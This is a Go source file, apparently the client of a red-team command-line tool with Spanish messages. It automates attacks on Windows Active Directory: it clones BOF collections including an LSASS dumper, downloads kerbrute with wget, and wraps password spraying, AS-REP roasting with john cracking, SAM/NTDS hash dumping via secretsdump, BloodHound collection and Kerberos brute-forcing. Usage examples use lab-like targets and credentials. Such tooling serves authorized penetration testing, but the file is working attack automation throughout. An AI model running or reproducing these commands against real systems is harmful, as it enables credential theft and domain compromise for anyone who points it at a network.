package client

import (
	"fmt"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
)

// ── BOF directory management ──────────────────────────────────────────────────

// getBofDir returns the local directory where BOF .o files are stored.
// Defaults to ./bof/ relative to the working directory; override with BOFS_DIR.
func getBofDir() string {
	if d := os.Getenv("BOFS_DIR"); d != "" {
		return d
	}
	return "bof"
}

type bofEntry struct {
	name string // canonical name (filename without arch suffix and .o)
	path string // full path to .o file
	repo string // top-level subdirectory (collection name)
}

// listBofFiles walks bofDir and returns every .o file found.
func listBofFiles(bofDir string) []bofEntry {
	var out []bofEntry
	filepath.WalkDir(bofDir, func(p string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() || !strings.HasSuffix(p, ".o") {
			return nil
		}
		base := filepath.Base(p)
		// Strip arch suffixes: .x64.o .x86.o .BOF.x64.o etc.
		name := strings.TrimSuffix(base, ".o")
		for _, sfx := range []string{".x64", ".x86", ".x32", ".amd64", ".BOF"} {
			name = strings.TrimSuffix(name, sfx)
		}
		rel, _ := filepath.Rel(bofDir, p)
		repo := strings.SplitN(rel, string(os.PathSeparator), 2)[0]
		out = append(out, bofEntry{name: strings.ToLower(name), path: p, repo: repo})
		return nil
	})
	return out
}

// resolveBof resolves a BOF name (or file path) to an absolute .o path.
// If name is an existing file, returns it unchanged.
// Otherwise searches bof/**/ for a .x64.o (preferred) or .o match.
func resolveBof(name string) string {
	if _, err := os.Stat(name); err == nil {
		return name
	}
	entries := listBofFiles(getBofDir())
	query := strings.ToLower(name)
	var x64, any string
	for _, e := range entries {
		if e.name == query {
			if strings.Contains(e.path, "x64") && x64 == "" {
				x64 = e.path
			} else if any == "" {
				any = e.path
			}
		}
	}
	if x64 != "" {
		return x64
	}
	return any
}

// bofNames returns unique canonical BOF names for tab completion.
func bofNames() []string {
	seen := map[string]bool{}
	var names []string
	for _, e := range listBofFiles(getBofDir()) {
		if !seen[e.name] {
			seen[e.name] = true
			names = append(names, e.name)
		}
	}
	sort.Strings(names)
	return names
}

// cmdBofInstall clones / git-pulls popular BOF collections into bof/.
func (cl *CLI) cmdBofInstall() {
	bofDir := getBofDir()
	if err := os.MkdirAll(bofDir, 0755); err != nil {
		fmt.Println("[!]", err)
		return
	}

	type repo struct {
		label string
		url   string
		dir   string
	}
	repos := []repo{
		{"BofAllTheThings (N7WEra) — aggregado compilado", "https://github.com/N7WEra/BofAllTheThings", "BofAllTheThings"},
		{"Situational Awareness (TrustedSec)", "https://github.com/TrustedSec/CS-Situational-Awareness-BOF", "situational-awareness"},
		{"nanodump (Fortra) — LSASS sin MiniDumpWriteDump", "https://github.com/fortra/nanodump", "nanodump"},
		{"C2-Tool-Collection (Outflank)", "https://github.com/outflanknl/C2-Tool-Collection", "outflank"},
		{"Misc BOFs (ajpc500)", "https://github.com/ajpc500/BOFs", "ajpc500"},
	}

	for _, r := range repos {
		dest := filepath.Join(bofDir, r.dir)
		if _, err := os.Stat(filepath.Join(dest, ".git")); err == nil {
			fmt.Printf("  \033[34m[~]\033[0m %-50s actualizando\n", r.label)
			cl.runLocalShell("git -C " + shellescape(dest) + " pull -q --ff-only 2>&1 | tail -1")
		} else {
			fmt.Printf("  \033[33m[+]\033[0m %-50s clonando\n", r.label)
			cl.runLocalShell("git clone -q --depth 1 " + shellescape(r.url) + " " + shellescape(dest) + " 2>&1")
		}
		// Outflank C2-Tool-Collection ships only .c sources — compile after clone/pull
		if r.dir == "outflank" {
			makefile := filepath.Join(dest, "BOF", "Makefile")
			if _, err := os.Stat(makefile); err == nil {
				fmt.Printf("  \033[33m[*]\033[0m %-50s compilando BOFs (mingw)…\n", r.label)
				cl.runLocalShell("make -C " + shellescape(filepath.Join(dest, "BOF")) + " 2>&1 | tail -5")
			}
		}
	}
	fmt.Println()
	cl.cmdBofList()
}

// cmdBofList prints all .o files grouped by collection.
func (cl *CLI) cmdBofList() {
	bofDir := getBofDir()
	entries := listBofFiles(bofDir)
	if len(entries) == 0 {
		fmt.Printf("[!] sin BOFs en %s/  →  ejecuta: bof install\n\n", bofDir)
		fmt.Print("uso: bof <nombre|archivo.o> [val:tipo ...]\n\n")
		fmt.Print("tipos de argumento:\n")
		fmt.Print("  texto:z            C string (null-terminated)\n")
		fmt.Print("  texto:Z            wide string (UTF-16LE)\n")
		fmt.Print("  42:i               int32\n")
		fmt.Print("  256:s              int16\n")
		fmt.Print("  /ruta/datos.bin:b  fichero binario\n\n")
		fmt.Print("ejemplos (una vez instalados):\n")
		fmt.Print("  bof arp\n")
		fmt.Print("  bof nanodump\n")
		fmt.Print("  bof ldapsearch DC=corp,DC=com:z LDAP:z (LDAP 389):i\n")
		fmt.Print("  bof /tmp/custom.x64.o arg:z\n")
		return
	}
	byRepo := map[string][]bofEntry{}
	for _, e := range entries {
		byRepo[e.repo] = append(byRepo[e.repo], e)
	}
	repos := make([]string, 0, len(byRepo))
	for r := range byRepo {
		repos = append(repos, r)
	}
	sort.Strings(repos)
	total := 0
	for _, r := range repos {
		es := byRepo[r]
		fmt.Printf("\n\033[1m── %s\033[0m (%d)\n", r, len(es))
		for _, e := range es {
			fmt.Printf("  %-35s %s\n", e.name, e.path)
		}
		total += len(es)
	}
	fmt.Printf("\ntotal: %d BOFs en %s/\n", total, bofDir)
}

// shellescape wraps a path in single quotes, escaping any embedded single quotes.
func shellescape(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
}

// ── local shell passthrough ───────────────────────────────────────────────────

func (cl *CLI) runLocalShell(cmd string) {
	c := exec.Command("sh", "-c", cmd)
	c.Stdout = os.Stdout
	c.Stderr = os.Stderr
	c.Stdin = os.Stdin
	c.Run()
}

func (cl *CLI) runTool(args []string) {
	if len(args) == 0 {
		return
	}
	c := exec.Command(args[0], args[1:]...)
	c.Stdout = os.Stdout
	c.Stderr = os.Stderr
	c.Stdin = os.Stdin
	c.Run()
}

// findTool busca una herramienta en PATH y directorios habituales.
func (cl *CLI) findTool(names ...string) string {
	extra := []string{"/tmp", "/usr/local/bin", filepath.Join(os.Getenv("HOME"), ".local/bin")}
	for _, name := range names {
		if p, err := exec.LookPath(name); err == nil {
			return p
		}
		for _, dir := range extra {
			p := filepath.Join(dir, name)
			if _, err := os.Stat(p); err == nil {
				return p
			}
		}
	}
	return ""
}

func (cl *CLI) mustTool(names ...string) string {
	p := cl.findTool(names...)
	if p == "" {
		fmt.Printf("[!] herramienta no encontrada: %s — ejecuta 'setup'\n", strings.Join(names, "/"))
	}
	return p
}

// parseLocalFlags separa argumentos posicionales de flags -key val.
func parseLocalFlags(args []string) (pos []string, flags map[string]string) {
	flags = make(map[string]string)
	i := 0
	for i < len(args) {
		if strings.HasPrefix(args[i], "-") {
			key := strings.TrimLeft(args[i], "-")
			if i+1 < len(args) && !strings.HasPrefix(args[i+1], "-") {
				flags[key] = args[i+1]
				i += 2
			} else {
				flags[key] = "true"
				i++
			}
		} else {
			pos = append(pos, args[i])
			i++
		}
	}
	return
}

// ── setup ─────────────────────────────────────────────────────────────────────

func (cl *CLI) cmdSetup() {
	type entry struct {
		label   string
		names   []string // alternativas en PATH
		install string   // comando de instalación si falta
	}
	tools := []entry{
		{"nmap",              []string{"nmap"},                           "apt-get install -y nmap"},
		{"nxc / netexec",    []string{"nxc", "netexec"},                 "apt-get install -y netexec 2>/dev/null || pipx install netexec"},
		{"impacket",         []string{"impacket-secretsdump"},           "apt-get install -y python3-impacket impacket-scripts 2>/dev/null || pip3 install impacket"},
		{"bloodhound-python",[]string{"bloodhound-python","bloodhound-python3"}, "pip3 install bloodhound 2>/dev/null || apt-get install -y bloodhound-python3"},
		{"john",             []string{"john"},                           "apt-get install -y john"},
	}

	fmt.Println("\n── herramientas ──────────────────────────────────────────────")
	for _, t := range tools {
		if p := cl.findTool(t.names...); p != "" {
			fmt.Printf("  \033[32m[+]\033[0m %-25s %s\n", t.label, p)
		} else {
			fmt.Printf("  \033[33m[!]\033[0m %-25s instalando...\n", t.label)
			cl.runLocalShell(t.install)
		}
	}

	// kerbrute — binario suelto de GitHub
	if p := cl.findTool("kerbrute"); p != "" {
		fmt.Printf("  \033[32m[+]\033[0m %-25s %s\n", "kerbrute", p)
	} else {
		fmt.Printf("  \033[33m[!]\033[0m %-25s descargando...\n", "kerbrute")
		cl.runLocalShell(`wget -qO /tmp/kerbrute \
  https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 \
  && chmod +x /tmp/kerbrute && echo "[+] kerbrute → /tmp/kerbrute"`)
	}
	fmt.Println()
}

// ── scan ──────────────────────────────────────────────────────────────────────

const scanUsage = `uso: scan <target> [-p <ports>]

  sin -p   → TCP completo  (nmap -sS -p- --min-rate 5000 -T4)
  con -p   → puertos dados + detección de servicios y scripts

ejemplos:
  scan 10.2.20.100
  scan 10.2.20.100 -p 53,88,135,139,389,445,464,636,3268,3389,5985`

func (cl *CLI) cmdScan(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 {
		fmt.Println(scanUsage)
		return
	}
	tool := cl.mustTool("nmap")
	if tool == "" {
		return
	}
	target := pos[0]
	var a []string
	if p, ok := flags["p"]; ok {
		a = []string{"-Pn", "-n", "-sV", "-sC", "-T4", "-p", p, target}
	} else {
		a = []string{"-Pn", "-n", "-sS", "-p-", "--min-rate", "5000", "-T4", target}
	}
	fmt.Printf("[*] nmap %s\n", strings.Join(a, " "))
	cl.runTool(append([]string{tool}, a...))
}

// ── enum ──────────────────────────────────────────────────────────────────────

const enumUsage = `uso: enum <target> [-u <user>] [-p <pass>]

  sin credenciales → null/guest session (shares, pass-pol, rid-brute)
  con credenciales → users, groups, shares, admin-count (SMB + LDAP)

ejemplos:
  enum 10.2.20.100
  enum 10.2.20.100 -u 'mssql_svc$' -p shelby`

func (cl *CLI) cmdEnum(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 {
		fmt.Println(enumUsage)
		return
	}
	tool := cl.mustTool("nxc", "netexec")
	if tool == "" {
		return
	}
	target := pos[0]
	user, pass := flags["u"], flags["p"]

	base := []string{tool, "smb", target, "-u", user, "-p", pass}
	for _, action := range []string{"--shares", "--users", "--groups", "--pass-pol"} {
		fmt.Printf("\n\033[36m[*] smb %s %s\033[0m\n", target, action)
		cl.runTool(append(base, action))
	}
	if user != "" {
		fmt.Printf("\n\033[36m[*] ldap %s --admin-count\033[0m\n", target)
		cl.runTool([]string{tool, "ldap", target, "-u", user, "-p", pass, "--admin-count"})
	}
}

// ── spray ─────────────────────────────────────────────────────────────────────

const sprayUsage = `uso: spray <target> -u <userlist> -p <password>

  Prueba una contraseña contra todos los usuarios del fichero.

ejemplos:
  spray 10.2.20.100 -u userlist.txt -p ncc1701
  spray 10.2.20.100 -u userlist.txt -p 'Changeme123!'`

func (cl *CLI) cmdSpray(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["u"] == "" || flags["p"] == "" {
		fmt.Println(sprayUsage)
		return
	}
	tool := cl.mustTool("nxc", "netexec")
	if tool == "" {
		return
	}
	fmt.Printf("[*] password spray → %s  pass=%s\n", pos[0], flags["p"])
	cl.runTool([]string{tool, "smb", pos[0],
		"-u", flags["u"], "-p", flags["p"], "--continue-on-success"})
}

// ── asrep ─────────────────────────────────────────────────────────────────────

const asrepUsage = `uso: asrep <target> -d <domain> -u <userlist> [-w <wordlist>]

  Solicita TGT sin preauth para cada usuario del fichero.
  Si se encuentra algún hash, intenta crackearlos con john.

  -w   wordlist para john  (por defecto: badpwds.txt si existe, o rockyou.txt)

ejemplos:
  asrep 10.2.20.100 -d cs.org -u userlist.txt
  asrep 10.2.20.100 -d cs.org -u userlist.txt -w /usr/share/wordlists/rockyou.txt`

func (cl *CLI) cmdASREP(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["d"] == "" || flags["u"] == "" {
		fmt.Println(asrepUsage)
		return
	}
	tool := cl.mustTool("impacket-GetNPUsers", "GetNPUsers.py")
	if tool == "" {
		return
	}
	target, domain, userlist := pos[0], flags["d"], flags["u"]
	outFile := "/tmp/asrep_" + strings.ReplaceAll(target, ".", "_") + ".hash"

	fmt.Printf("[*] AS-REP roasting → %s  domain=%s\n", target, domain)
	cl.runTool([]string{tool, domain + "/",
		"-dc-ip", target, "-no-pass",
		"-usersfile", userlist, "-format", "hashcat",
		"-outputfile", outFile,
	})

	data, err := os.ReadFile(outFile)
	if err != nil || len(data) == 0 {
		fmt.Println("[!] no se obtuvieron hashes")
		return
	}
	fmt.Printf("[+] hashes → %s\n", outFile)

	john := cl.findTool("john")
	if john == "" {
		return
	}
	wordlist := flags["w"]
	if wordlist == "" {
		if _, e := os.Stat("badpwds.txt"); e == nil {
			wordlist = "badpwds.txt"
		} else {
			wordlist = "/usr/share/wordlists/rockyou.txt"
		}
	}
	fmt.Printf("[*] john --wordlist=%s\n", wordlist)
	cl.runTool([]string{john, "--format=krb5asrep", "--wordlist=" + wordlist, outFile})
	cl.runTool([]string{john, "--format=krb5asrep", "--show", outFile})
}

// ── secretsdump ───────────────────────────────────────────────────────────────

const secretsdumpUsage = `uso: secretsdump <target> -u <user> -p <pass> [-d <domain>]

  Vuelca hashes del SAM/NTDS.DIT vía DCSync o SMB.

ejemplos:
  secretsdump 10.2.20.100 -u localuser -p password
  secretsdump 10.2.20.100 -u Administrator -p password -d cs.org`

func (cl *CLI) cmdSecretsDump(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["u"] == "" || flags["p"] == "" {
		fmt.Println(secretsdumpUsage)
		return
	}
	tool := cl.mustTool("impacket-secretsdump", "secretsdump.py")
	if tool == "" {
		return
	}
	target, user, pass := pos[0], flags["u"], flags["p"]
	domain := flags["d"]
	identity := user + ":" + pass + "@" + target
	if domain != "" {
		identity = domain + "/" + identity
	}
	outBase := "/tmp/ntds_" + strings.ReplaceAll(target, ".", "_")
	fmt.Printf("[*] secretsdump → %s  output=%s.*\n", target, outBase)
	cl.runTool([]string{tool, identity, "-outputfile", outBase})
}

// ── bloodhound ────────────────────────────────────────────────────────────────

const bloodhoundUsage = `uso: bloodhound <target> -d <domain> -u <user> -p <pass> [-dc <fqdn>]

  Recolecta todos los objetos AD con bloodhound-python.
  -dc   FQDN del DC (ej: WIN2022-SRV-X64.cs.org); si se omite usa el dominio.

ejemplos:
  bloodhound 10.2.20.100 -d cs.org -u 'mssql_svc$' -p shelby
  bloodhound 10.2.20.100 -d cs.org -u 'mssql_svc$' -p shelby -dc WIN2022-SRV-X64.cs.org`

func (cl *CLI) cmdBloodHound(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["d"] == "" || flags["u"] == "" || flags["p"] == "" {
		fmt.Println(bloodhoundUsage)
		return
	}
	tool := cl.mustTool("bloodhound-python", "bloodhound-python3")
	if tool == "" {
		return
	}
	target, domain := pos[0], flags["d"]
	dc := flags["dc"]
	if dc == "" {
		dc = domain
	}
	outDir := "/tmp/bloodhound_" + strings.ReplaceAll(target, ".", "_")
	os.MkdirAll(outDir, 0700)
	fmt.Printf("[*] bloodhound-python → %s  output=%s\n", target, outDir)
	cl.runTool([]string{tool,
		"-u", flags["u"], "-p", flags["p"],
		"-d", domain, "-ns", target, "-dc", dc,
		"-c", "All", "--zip", "-o", outDir,
	})
}

// ── kerbrute ──────────────────────────────────────────────────────────────────

const kerbruteUsage = `uso: kerbrute <subcommand> -d <domain> --dc <target> <wordlist> [-t <threads>]

  subcommands:
    enum   (userenum)      → enumera usuarios válidos
    brute  (bruteuser)     → bruteforce de un usuario (-U <usuario>)
    spray  (passwordspray) → spraying: wordlist=fichero de passwords, -U userlist

ejemplos:
  kerbrute enum -d cs.org --dc 10.2.20.100 humans.txt
  kerbrute brute -d cs.org --dc 10.2.20.100 badpwds.txt -U mssql_svc
  kerbrute spray -d cs.org --dc 10.2.20.100 passwords.txt -U userlist.txt`

func (cl *CLI) cmdKerbrute(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) < 2 || flags["d"] == "" || flags["dc"] == "" {
		fmt.Println(kerbruteUsage)
		return
	}
	tool := cl.mustTool("kerbrute")
	if tool == "" {
		return
	}
	subMap := map[string]string{
		"enum": "userenum", "userenum": "userenum",
		"brute": "bruteuser", "bruteuser": "bruteuser",
		"spray": "passwordspray", "passwordspray": "passwordspray",
	}
	sub, ok := subMap[pos[0]]
	if !ok {
		fmt.Printf("[!] subcommand desconocido: %s\n", pos[0])
		fmt.Println(kerbruteUsage)
		return
	}
	wordlist := pos[1]
	threads := flags["t"]
	if threads == "" {
		threads = "50"
	}
	a := []string{tool, sub, "--dc", flags["dc"], "-d", flags["d"], wordlist, "-t", threads}
	if u, ok := flags["U"]; ok {
		a = append(a, u) // bruteuser needs username as last arg
	}
	cl.runTool(a)
}
